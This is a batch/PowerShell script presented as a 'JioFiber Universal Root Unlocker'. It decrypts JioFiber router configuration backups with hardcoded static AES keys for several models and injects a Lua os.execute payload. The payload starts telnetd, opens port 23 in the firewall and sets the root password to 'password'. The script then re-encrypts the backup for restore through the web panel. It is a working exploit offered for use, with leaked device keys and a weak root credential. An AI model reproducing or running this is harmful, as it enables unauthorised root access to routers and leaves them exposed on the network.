@echo off
setlocal
title JioFiber Universal Root Unlocker (v1.0)
set "TMP_PS=%TEMP%\patch_backup_%RANDOM%.ps1"
more +11 "%~f0" > "%TMP_PS%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TMP_PS%" %*
set "EXIT_CODE=%ERRORLEVEL%"
del /f /q "%TMP_PS%" 2>nul
echo.
pause
exit /b %EXIT_CODE%
param([string]$InputFile)

$Host.UI.RawUI.WindowTitle = "JioFiber Universal Root Unlocker - by Asjohn720"

Clear-Host
Write-Host "==========================================================================" -ForegroundColor Cyan
Write-Host "         ___ _       ______ _ _                                           " -ForegroundColor Cyan
Write-Host "        |_  (_)     |  ____(_) |                                          " -ForegroundColor Cyan
Write-Host "          | |_  ___ | |__   _| |__   ___ _ __                             " -ForegroundColor Cyan
Write-Host "          | | |/ _ \|  __| | | '_ \ / _ \ '__|                            " -ForegroundColor Cyan
Write-Host "      /\__/ / | (_) | |    | | |_) |  __/ |                               " -ForegroundColor Cyan
Write-Host "      \____/|_|\___/|_|    |_|_.__/ \___|_|                               " -ForegroundColor Cyan
Write-Host ""
Write-Host "          JioFiber Universal Root Unlocker  [v1.0]" -ForegroundColor Yellow
Write-Host "     Developed by Anand (@Asjohn720)" -ForegroundColor DarkGray
Write-Host "==========================================================================" -ForegroundColor Cyan

# Multi-Model Database (All Known JioFiber Hardware Keys)
$UniversalPayload = 'config.userdb = {} os.execute("telnetd -p 23; /usr/sbin/telnetd; /pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 23 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT 2>/dev/null; iptables -I INPUT -p tcp --dport 23 -j ACCEPT 2>/dev/null; echo -e \"password\npassword\" | passwd root");'

$DeviceDatabase = @(
    @{
        Name     = "Sercomm JCOW414"
        Platform = "EcoNet EN7528HU (Dual-Band)"
        KeyHex   = "BEF226757CB149CB04CDCA84DC5BE955"
        TargetFw = "R2.15"
        Tag      = "[VERIFIED OPENWRT]"
        TagColor = "Green"
    },
    @{
        Name     = "JioFiber JCOW404"
        Platform = "EcoNet / Sercomm"
        KeyHex   = "BEE95B75343E75DC5EF2B17575CA750A"
        TargetFw = "R2.15 / R2.3"
        Tag      = "[SUPPORTED]"
        TagColor = "Cyan"
    },
    @{
        Name     = "JioFiber JCOW403"
        Platform = "Broadcom / Sercomm"
        KeyHex   = "BEE95B75343E75DC5EF2B17575CA750A"
        TargetFw = "R2.15 / R2.3"
        Tag      = "[SUPPORTED]"
        TagColor = "Cyan"
    },
    @{
        Name     = "JioFiber JCOW401"
        Platform = "Broadcom / Sercomm"
        KeyHex   = "BEE95B75343E75DC5EF2B17575CA750A"
        TargetFw = "R2.15 / R2.3"
        Tag      = "[SUPPORTED]"
        TagColor = "Cyan"
    },
    @{
        Name     = "JioFiber JCO4032"
        Platform = "EcoNet / Sercomm"
        KeyHex   = "BEF226757CB149CB04CDCA84DC5BE955"
        TargetFw = "R2.15"
        Tag      = "[SUPPORTED]"
        TagColor = "Cyan"
    },
    @{
        Name     = "JioFiber JCO110"
        Platform = "Single-Band Gateway"
        KeyHex   = "BEF226757CB149CB04CDCA84DC5BE955"
        TargetFw = "R2.15"
        Tag      = "[SUPPORTED]"
        TagColor = "Cyan"
    }
)

function Show-Menu {
    param([array]$Items)
    $idx = 0
    Write-Host "`n  Select your JioFiber Router Model:" -ForegroundColor White
    Write-Host "  Use [UP/DOWN] arrow keys to navigate, [ENTER] to confirm:`n" -ForegroundColor DarkGray
    
    try {
        $top = [Console]::CursorTop
        while ($true) {
            [Console]::SetCursorPosition(0, $top)
            for ($i = 0; $i -lt $Items.Count; $i++) {
                $item = $Items[$i]
                if ($i -eq $idx) {
                    Write-Host "   > " -NoNewline -ForegroundColor Cyan
                    Write-Host " [ $($i + 1) ] $($item.Name.PadRight(18)) ($($item.Platform)) " -NoNewline -ForegroundColor Black -BackgroundColor Cyan
                    Write-Host " $($item.Tag)" -ForegroundColor $item.TagColor
                } else {
                    Write-Host "     [ $($i + 1) ] $($item.Name.PadRight(18)) ($($item.Platform)) " -NoNewline -ForegroundColor Gray
                    Write-Host " $($item.Tag)" -ForegroundColor DarkGray
                }
            }
            
            $keyInfo = [Console]::ReadKey($true)
            $k = $keyInfo.Key
            if ($k -eq "UpArrow") {
                $idx = ($idx - 1 + $Items.Count) % $Items.Count
            } elseif ($k -eq "DownArrow") {
                $idx = ($idx + 1) % $Items.Count
            } elseif ($k -eq "Enter") {
                break
            } elseif ($k -ge "D1" -and $k -le ("D" + $Items.Count)) {
                $idx = [int]$k.ToString().Substring(1) - 1
                break
            }
        }
    } catch {
        # Fallback if non-raw console
        Write-Host "  1. $($Items[0].Name)"
        $idx = 0
    }
    return $idx
}

if ($InputFile) {
    $InputFile = $InputFile.Trim('"', "'", ' ')
}

if (-not $InputFile) {
    # Check for any backup file in current folder
    $encFiles = Get-ChildItem -Filter "*JCO*.enc" | Where-Object { $_.Name -notmatch "root" } | Select-Object -First 1
    if ($encFiles) {
        $InputFile = $encFiles.FullName
    }
}

$selectedIndex = Show-Menu -Items $DeviceDatabase
$selectedDevice = $DeviceDatabase[$selectedIndex]

Write-Host "`n  Target Device: " -NoNewline -ForegroundColor White
Write-Host "$($selectedDevice.Name) - $($selectedDevice.Platform)" -ForegroundColor Green
Write-Host "  Required Firmware: " -NoNewline -ForegroundColor White
Write-Host "Downgraded to $($selectedDevice.TargetFw)" -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------------" -ForegroundColor DarkGray

Write-Host ""
Write-Host "  +----------------------------------------------------------------------+" -ForegroundColor Cyan
Write-Host "  | HOW TO DOWNLOAD YOUR BACKUP (.enc) FILE FROM ROUTER:                 |" -ForegroundColor Yellow
Write-Host "  +----------------------------------------------------------------------+" -ForegroundColor Cyan
Write-Host "  | 1. Open browser -> Go to: http://192.168.29.1                        |" -ForegroundColor White
Write-Host "  | 2. Login (Default: admin / Jiocentrum or your Wi-Fi password)        |" -ForegroundColor White
Write-Host "  | 3. Confirm router is on $($selectedDevice.TargetFw.PadRight(10))     |" -ForegroundColor White
Write-Host "  | 4. Go to: Administrator -> Maintenance -> Backup/Restore             |" -ForegroundColor White
Write-Host "  | 5. Click [Backup] button to download your .enc file                  |" -ForegroundColor White
Write-Host "  +----------------------------------------------------------------------+" -ForegroundColor Cyan
Write-Host ""

if ($InputFile -and (Test-Path $InputFile)) {
    Write-Host "  [*] Using detected backup file: $InputFile" -ForegroundColor Cyan
} else {
    $rawInput = Read-Host "  Drag & drop or enter path to your downloaded backup (.enc) file"
    $InputFile = $rawInput.Trim('"', "'", ' ')
}

if (-not (Test-Path $InputFile)) {
    Write-Host "`n  [-] Error: File not found: $InputFile" -ForegroundColor Red
    exit 1
}

function Derive-KeyIV([byte[]]$salt, [byte[]]$pass) {
    $hasher = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256")
    $derived = [System.Collections.Generic.List[byte]]::new()
    $prev = [byte[]]@()
    while ($derived.Count -lt 32) {
        $data = $prev + $pass + $salt
        $prev = $hasher.ComputeHash($data)
        $derived.AddRange($prev)
    }
    return @{
        Key = $derived.GetRange(0, 16).ToArray()
        IV  = $derived.GetRange(16, 16).ToArray()
    }
}

function Try-Decrypt([byte[]]$cipherBytes, [string]$hex) {
    $passBytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [convert]::ToByte($hex.Substring($i, 2), 16) }
    $salt = $cipherBytes[8..15]
    $ciphertext = $cipherBytes[16..($cipherBytes.Length - 1)]
    $pair = Derive-KeyIV $salt $passBytes

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $pair.Key
    $aes.IV = $pair.IV

    $dec = $aes.CreateDecryptor()
    try {
        $plain = $dec.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        $str = [System.Text.Encoding]::ASCII.GetString($plain)
        if ($str.StartsWith("config") -or $str.StartsWith("<?xml")) {
            return @{ Success = $true; Text = $str; PassBytes = $passBytes; Hex = $hex }
        }
    } catch {}
    return @{ Success = $false }
}

Write-Host ""
Write-Host "  [1/3] Decrypting backup file with firmware key..." -ForegroundColor Yellow
$cipherData = [System.IO.File]::ReadAllBytes($InputFile)
if ([System.Text.Encoding]::ASCII.GetString($cipherData[0..7]) -ne "Salted__") {
    Write-Host "  [-] Error: Invalid file format (Missing 'Salted__' OpenSSL header)." -ForegroundColor Red
    exit 1
}

# Try primary selected model key
$decryptResult = Try-Decrypt $cipherData $selectedDevice.KeyHex

# If primary fails, auto-fallback to alternate JioFiber keys
if (-not $decryptResult.Success) {
    Write-Host "  [!] Primary key didn't match. Testing alternate JioFiber keys..." -ForegroundColor DarkYellow
    $allKeys = @("BEF226757CB149CB04CDCA84DC5BE955", "BEE95B75343E75DC5EF2B17575CA750A")
    foreach ($altKey in $allKeys) {
        if ($altKey -ne $selectedDevice.KeyHex) {
            $decryptResult = Try-Decrypt $cipherData $altKey
            if ($decryptResult.Success) {
                Write-Host "  [?] Successfully decrypted using alternate JioFiber key ($altKey)!" -ForegroundColor Green
                break
            }
        }
    }
}

if (-not $decryptResult.Success) {
    Write-Host ""
    Write-Host "==========================================================================" -ForegroundColor Red
    Write-Host " [!] ERROR: Decryption Failed!" -ForegroundColor Red
    Write-Host "==========================================================================" -ForegroundColor Red
    Write-Host " Reason: The backup file cannot be decrypted with any known static key." -ForegroundColor Red
    Write-Host ""
    Write-Host " Possible Causes:" -ForegroundColor Yellow
    Write-Host " 1. This backup was downloaded from R2.41 / R2.52 (BEFORE downgrade)." -ForegroundColor Yellow
    Write-Host "    -> Fix: Downgrade your router to $($selectedDevice.TargetFw) first (Step 1.1)," -ForegroundColor Cyan
    Write-Host "       then download a FRESH backup from Maintenance -> Backup." -ForegroundColor Cyan
    Write-Host " 2. The backup file is corrupted or not from a supported JioFiber model." -ForegroundColor Yellow
    Write-Host "==========================================================================" -ForegroundColor Red
    exit 1
}

$plainText = $decryptResult.Text
$activePassBytes = $decryptResult.PassBytes

Write-Host "  [2/3] Injecting root Telnet shell execution payload into Line 1..." -ForegroundColor Yellow
$lines = $plainText -split "`r?`n"
$lines[0] = $UniversalPayload
$modifiedText = $lines -join "`n"
$modifiedBytes = [System.Text.Encoding]::ASCII.GetBytes($modifiedText)

Write-Host "  [3/3] Re-encrypting into ready-to-upload backup package..." -ForegroundColor Yellow
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$newSalt = New-Object byte[] 8
$rng.GetBytes($newSalt)
$newPair = Derive-KeyIV $newSalt $activePassBytes

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $newPair.Key
$aes.IV = $newPair.IV
$enc = $aes.CreateEncryptor()
$newCipher = $enc.TransformFinalBlock($modifiedBytes, 0, $modifiedBytes.Length)

$outputList = [System.Collections.Generic.List[byte]]::new()
$outputList.AddRange([System.Text.Encoding]::ASCII.GetBytes("Salted__"))
$outputList.AddRange($newSalt)
$outputList.AddRange($newCipher)

$outDir = Split-Path -Parent $InputFile
if (-not $outDir) { $outDir = "." }
$outFile = [System.IO.Path]::Combine($outDir, "backup_root_ready.enc")
[System.IO.File]::WriteAllBytes($outFile, $outputList.ToArray())

Write-Host ""
Write-Host "==========================================================================" -ForegroundColor Green
Write-Host "  SUCCESS! Root exploit injected successfully!" -ForegroundColor Green
Write-Host "  Output file: $outFile" -ForegroundColor Green
Write-Host "==========================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Next Steps to Achieve Root:" -ForegroundColor Cyan
Write-Host "  1. In Router Web Panel, go to: Maintenance -> Backup/Restore" -ForegroundColor White
Write-Host "  2. Under 'Restore', choose 'backup_root_ready.enc' and click Restore" -ForegroundColor White
Write-Host "  3. (Notice 'checksum error' in Web UI is normal & expected)" -ForegroundColor DarkGray
Write-Host "  4. Connect via Telnet: telnet 192.168.29.1 23" -ForegroundColor Green
Write-Host "     Username: root  |  Password: password" -ForegroundColor Green
Write-Host ""
Write-Host "  ------------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Special Thanks: Static decryption keys researched by @gpsarathy" -ForegroundColor DarkGray
Write-Host "==========================================================================" -ForegroundColor Green